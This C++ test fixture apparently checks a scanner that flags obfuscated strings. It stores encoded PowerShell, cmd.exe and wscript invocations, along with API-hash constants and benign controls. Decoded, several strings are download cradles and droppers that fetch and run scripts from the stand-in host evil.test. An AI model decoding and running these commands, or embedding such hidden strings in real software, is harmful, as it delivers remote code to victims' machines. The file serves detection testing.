// Fixture for the CyberChef encoded-string scan (include/net/cyberchef.hpp).
//
// Every interesting string is stored encoded, the way a sample hides it
// from a plain `strings` pass:
//   k_rot13_ps    - ROT13 of a PowerShell invocation
//   k_rot13_url   - ROT13 of a wscript dropper that fetches a remote script
//   k_rot47_ps    - ROT47 of the same PowerShell payload (punctuation cipher)
//   k_xor_ps      - XOR 0x5A of a PowerShell invocation (single-byte XOR)
//   k_rotp_cmd    - printable-ROT (+9) of a cmd.exe invocation
//   k_b64_evil    - base64 of an IEX / Net.WebClient download cradle
//   k_b64u16_ps   - base64 of the UTF-16LE PowerShell string (-enc shape)
//   k_hex_cmd     - hex of a cmd.exe invocation
//   k_b32_wscript - base32 of a wscript invocation
//   k_b58_iex     - base58 of an IEX / Net.WebClient cradle
//   k_b85_wscript - base85 (ASCII85) of a wscript invocation
//   k_hash_pjw    - PJW hash constant of LoadLibraryA
//   k_hash_djb2   - DJB2 hash constant of VirtualAlloc
//   k_hash_fnv    - FNV-1a hash constant of GetProcAddress
//
// The two controls must NOT be flagged and are the false-positive guards
// for the scan: k_plain_benign is ordinary prose, k_b64_benign decodes to
// ordinary prose (readable, but no indicator hit).
//
// Expected: 14 flagged entries - ROT13 x2, ROT47 x1, XOR 0x5a x1,
// ROT printable +86 x1 (the +9 encoding inverted), From Base64 x1,
// From Base64 + Decode text x1, From Hex x1, From Base32 x1,
// From Base58 x1, From Base85 x1, and PJW / DJB2 / FNV-1a API hash x1
// each - and 0 flags for the controls.

#include <cstdio>

static const char k_rot13_ps[]  = "cbjrefuryy -abc -j uvqqra -rap FDOSNStN";
static const char k_rot13_url[] = "jfpevcg.rkr //O //R:WFpevcg uggc://rivy.grfg/qebc.iof";
static const char k_rot47_ps[]  = "A@H6CD96== \\?@A \\H 9:556? \\6?4 $\"qupu8p";
static const char k_b64_evil[]  =
    "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw"
    "Oi8vZXZpbC50ZXN0L3BheWxvYWQucHMxJyk=";
static const char k_b64_benign[] =
    "VGhpcyBhcHBsaWNhdGlvbiBoYXMgZW5jb3VudGVyZWQgYSBydW50aW1lIGVycm9yIGFu"
    "ZCBtdXN0IGNsb3NlIG5vdw==";
static const char k_hex_cmd[]    = "636D642E657865202F632077686F616D69";
static const char k_xor_ps[]     = "*5-?()2?66zw45*zw-z23>>?4";
static const char k_rotp_cmd[]   = "lvm7n\"n)8l)ljul";
static const char k_b64u16_ps[]  =
    "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgA=";
static const char k_b32_wscript[] =
    "O5ZWG4TJOB2C4ZLYMUQC6L2CEAXS6RJ2JJJWG4TJOB2A====";
static const char k_b58_iex[] =
    "2p9iPTGhoeQNdDfrbZXU7cwYpQWwENfdQASeCZBgEDaQXvcggFTVWuTqcTPB1G";
static const char k_b85_wscript[] = "GB787BlJ/HAU%c/0/#X70/#aT8lK5?BlJ.";
static const char k_hash_pjw[]    = "0x0AADF0F1";
static const char k_hash_djb2[]   = "0x382C0F97";
static const char k_hash_fnv[]    = "0xF8F45725";
static const char k_plain_benign[] =
    "This application has encountered a runtime error and must close now";

int main(int argc, char** argv) {
  const char* samples[] = {
      k_rot13_ps,   k_rot13_url,   k_rot47_ps,   k_xor_ps,
      k_rotp_cmd,   k_b64_evil,    k_b64u16_ps,  k_b64_benign,
      k_hex_cmd,    k_b32_wscript, k_b58_iex,    k_b85_wscript,
      k_hash_pjw,   k_hash_djb2,   k_hash_fnv,   k_plain_benign,
  };
  for (const char* s : samples) std::puts(s);
  std::printf("encoded_sample argc=%d\n", argc);
  (void)argv;
  return 0;
}
